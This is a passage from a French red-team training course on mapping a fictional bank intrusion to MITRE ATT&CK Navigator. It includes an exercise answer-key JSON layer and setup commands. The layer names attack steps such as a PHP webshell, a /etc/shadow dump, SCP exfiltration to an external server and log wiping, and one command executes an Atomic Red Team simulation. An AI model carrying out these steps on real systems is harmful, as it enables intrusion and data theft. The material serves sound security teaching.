# Dans l'interface Navigator :
# 1. Cliquer sur l'icône de téléchargement (⬇)
# 2. Choisir "Download as JSON"
# 3. Enregistrer sous : CaisseNoire_heatmap.json
```

**Étape 5 : Interpréter les résultats** (10 min)

Analysez la heat map obtenue :

- **Quelles tactiques sont les plus couvertes ?** → Initial Access, Execution, Persistence
- **Quelles tactiques sont absentes ?** → Resource Development, Collection (partiellement), Defense Evasion (partiellement)
- **Quelle est la technique la plus critique ?** → T1190 (SQL Injection — accès initial)

**Question réflexion :** Si vous étiez le SOC de BanX, quelles sont les 3 techniques sur lesquelles concentrer vos efforts de détection en priorité ?

**Éléments de réponse :**

1. **T1190 (Exploit Public-Facing Application)** : C'est la porte d'entrée. Sans détection ici, l'attaquant a tout le temps nécessaire.
2. **T1505.003 (Web Shell)** : Un webshell est un marqueur fort de compromission. La détection doit être rapide.
3. **T1048.002 (Exfiltration Over Alternative Protocol)** : C'est le moment où les données quittent le réseau. C'est la dernière ligne de défense.

### 8.4 Rendu attendu

```text
📁 TP_MITRE_ATTACK/
├── CaisseNoire_heatmap.json     # Fichier de couche ATT&CK Navigator exporté
├── README_analyse.md            # Analyse de la heat map (5-10 lignes)
└── screenshot_heatmap.png       # Capture d'écran de la heat map (optionnel)
```

### 8.5 Exemple de fichier JSON de correction

Voici le fichier de couche correspondant à la correction de l'exercice :

```json
{
    "name": "Opération CaisseNoire - Red Team BanX",
    "version": "4.1",
    "domain": "mitre-enterprise",
    "description": "Heat map de l'engagement Red Team sur BanX — Mai 2026",
    "techniques": [
        {
            "techniqueID": "T1596",
            "sub-techniques": [
                {
                    "techniqueID": "T1596.001",
                    "color": "#1ba81b",
                    "score": 90,
                    "comment": "Scan Shodan — OSINT passif"
                }
            ],
            "color": "#1ba81b",
            "score": 90,
            "comment": "Scan Shodan"
        },
        {
            "techniqueID": "T1190",
            "color": "#d62728",
            "score": 100,
            "comment": "SQL Injection critique — accès initial réussi"
        },
        {
            "techniqueID": "T1505",
            "sub-techniques": [
                {
                    "techniqueID": "T1505.003",
                    "color": "#d62728",
                    "score": 95,
                    "comment": "Webshell PHP uploadé et persistant"
                }
            ],
            "color": "#d62728",
            "score": 95,
            "comment": "Webshell PHP"
        },
        {
            "techniqueID": "T1059",
            "sub-techniques": [
                {
                    "techniqueID": "T1059.004",
                    "color": "#f5b042",
                    "score": 70,
                    "comment": "Exécution de commandes shell via webshell"
                }
            ],
            "color": "#f5b042",
            "score": 70,
            "comment": "Exécution de commandes"
        },
        {
            "techniqueID": "T1068",
            "color": "#f5b042",
            "score": 85,
            "comment": "Exploit kernel CVE-2024-XXXX — élévation root"
        },
        {
            "techniqueID": "T1003",
            "color": "#d62728",
            "score": 90,
            "comment": "Dump /etc/shadow — 11 comptes extraits"
        },
        {
            "techniqueID": "T1110",
            "sub-techniques": [
                {
                    "techniqueID": "T1110.002",
                    "color": "#f5b042",
                    "score": 75,
                    "comment": "Crack de mots de passe — 3 comptes compromis"
                }
            ],
            "color": "#f5b042",
            "score": 75,
            "comment": "Password cracking"
        },
        {
            "techniqueID": "T1021",
            "sub-techniques": [
                {
                    "techniqueID": "T1021.004",
                    "color": "#f5b042",
                    "score": 80,
                    "comment": "SSH vers base de données (10.0.1.50)"
                }
            ],
            "color": "#f5b042",
            "score": 80,
            "comment": "SSH lateral movement"
        },
        {
            "techniqueID": "T1213",
            "color": "#f5b042",
            "score": 80,
            "comment": "mysqldump de toutes les bases"
        },
        {
            "techniqueID": "T1560",
            "sub-techniques": [
                {
                    "techniqueID": "T1560.001",
                    "color": "#98df8a",
                    "score": 70,
                    "comment": "Compression tar.gz (2.3 Go)"
                }
            ],
            "color": "#98df8a",
            "score": 70,
            "comment": "Archive collected data"
        },
        {
            "techniqueID": "T1048",
            "sub-techniques": [
                {
                    "techniqueID": "T1048.002",
                    "color": "#d62728",
                    "score": 95,
                    "comment": "Exfiltration SCP vers serveur VPS externe"
                }
            ],
            "color": "#d62728",
            "score": 95,
            "comment": "Exfiltration SCP"
        },
        {
            "techniqueID": "T1070",
            "sub-techniques": [
                {
                    "techniqueID": "T1070.003",
                    "color": "#f5b042",
                    "score": 85,
                    "comment": "Suppression logs Apache + historique bash"
                }
            ],
            "color": "#f5b042",
            "score": 85,
            "comment": "Suppression des logs"
        }
    ],
    "gradient": {
        "colors": [
            "#98df8a",
            "#f5b042",
            "#d62728"
        ],
        "minValue": 0,
        "maxValue": 100
    },
    "legendItems": [
        {
            "label": "Non testé / Non couvert",
            "color": "#ececec"
        },
        {
            "label": "Testé — non détecté",
            "color": "#f5b042"
        },
        {
            "label": "Testé et détecté",
            "color": "#98df8a"
        },
        {
            "label": "Testé et réussi (critique)",
            "color": "#d62728"
        }
    ],
    "filters": {
        "stages": ["act"],
        "platforms": ["linux"]
    },
    "sorting": 0,
    "viewMode": 0,
    "hideDisabled": true
}
```

### 8.6 Pour aller plus loin

- **Comparer deux couches :** importez la couche de correction ci-dessus et une couche "détection idéale" pour visualiser les gaps
- **Ajouter des métadonnées :** associez des tags CVSS, des identifiants CVE, ou des références internes
- **Automatiser la génération :** écrivez un script Python qui parse les logs d'un engagement Red Team et génère automatiquement le fichier JSON de couche ATT&CK

---

## Annexe A : Ressources

| Ressource | URL |
|---|---|
| MITRE ATT&CK (site officiel) | [https://attack.mitre.org](https://attack.mitre.org) |
| ATT&CK Navigator | [https://github.com/mitre-attack/attack-navigator](https://github.com/mitre-attack/attack-navigator) |
| Documentation STIX 2.1 | [https://oasis-open.github.io/cti-documentation/](https://oasis-open.github.io/cti-documentation/) |
| ANSSI — Guide d'hygiène | [https://www.ssi.gouv.fr/guide/guide-dhygiene-informatique/](https://www.ssi.gouv.fr/guide/guide-dhygiene-informatique/) |
| ANSSI — PASSI | [https://www.ssi.gouv.fr/entreprise/prestataires-cybersecurite/passi/](https://www.ssi.gouv.fr/entreprise/prestataires-cybersecurite/passi/) |
| Directive NIS2 (EUR-Lex) | [https://eur-lex.europa.eu/eli/dir/2022/2555](https://eur-lex.europa.eu/eli/dir/2022/2555) |
| MITRE ATT&CK pour Red Team | [https://attack.mitre.org/resources/getting-started/](https://attack.mitre.org/resources/getting-started/) |
| Sigma Rules (détection) | [https://github.com/SigmaHQ/sigma](https://github.com/SigmaHQ/sigma) |
| Atomic Red Team (tests) | [https://github.com/redcanaryco/atomic-red-team](https://github.com/redcanaryco/atomic-red-team) |

## Annexe B : Commandes essentielles

```bash
# === ATT&CK Navigator ===
git clone https://github.com/mitre-attack/attack-navigator.git
cd attack-navigator
docker build -t attack-navigator .
docker run -d -p 4200:4200 --name attack-navigator attack-navigator

# Arrêter le conteneur
docker stop attack-navigator

# Redémarrer le conteneur
docker start attack-navigator

# Supprimer le conteneur
docker rm attack-navigator

# === Recherche dans la matrice ATT&CK (API) ===
# Liste de toutes les techniques
curl -s https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack.json \
    | jq '.objects[] | select(.type=="attack-pattern") | {"id": .external_references[0].external_id, "name": .name}'

# Recherche d'une technique spécifique
curl -s https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack.json \
    | jq '.objects[] | select(.external_references[0].external_id == "T1190") | {name, description}'

# === Atomic Red Team (exécution de tests) ===
# Installation
git clone https://github.com/redcanaryco/atomic-red-team.git
cd atomic-red-team
pip install -r requirements.txt

# Exécution d'un test (ex: T1190 - SQL Injection)
Invoke-AtomicTest T1190 -ShowDetails
Invoke-AtomicTest T1190 -Execute
```

---

*Document rédigé pour la formation Red Team — Master 2 Sécurité et Défense des Systèmes d'Information — SDV 2026*
